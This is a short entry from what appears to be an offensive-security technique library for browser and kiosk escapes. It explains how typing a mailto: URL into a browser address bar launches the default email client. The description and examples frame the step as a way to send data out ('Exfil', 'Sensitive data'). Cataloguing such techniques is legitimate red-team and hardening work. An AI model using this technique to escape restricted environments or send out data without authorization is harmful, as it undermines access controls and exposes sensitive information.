---
id: 7e7a3383-0223-42aa-bc7a-04c06d57f579
name: browser-enter-mailto-url
type: command
executor: browser
data: 'mailto:$_RECIPIENT?subject=$_SUBJECT&body=$_BODY'
output: null
created_at: '2023-04-06T03:56:17.452587+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
  - Browser
tags:
  - protocol-handler
  - browser-escape
  - email
verified: true
validated: true
---

# browser-enter-mailto-url

## Command

In the browser address bar, enter:

```text
mailto:$_RECIPIENT?subject=$_SUBJECT&body=$_BODY
```

## Description

This opens the default email client to compose a message, allowing data exfiltration via attachments or body text.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_RECIPIENT | Email address (e.g., example@example.com) | Yes |
| $_SUBJECT | Message subject | No |
| $_BODY | Message body text | No |

## Examples

### Basic Usage

```text
mailto:example@example.com
```

### Advanced Usage

```text
mailto:example@example.com?subject=Exfil&body=Sensitive data
```

## Expected Output

Email client launches with pre-filled fields. Success: Draft ready for sending.

## Related

- [[procedures/Browser-Escape-via-Unassociated-Protocols]]
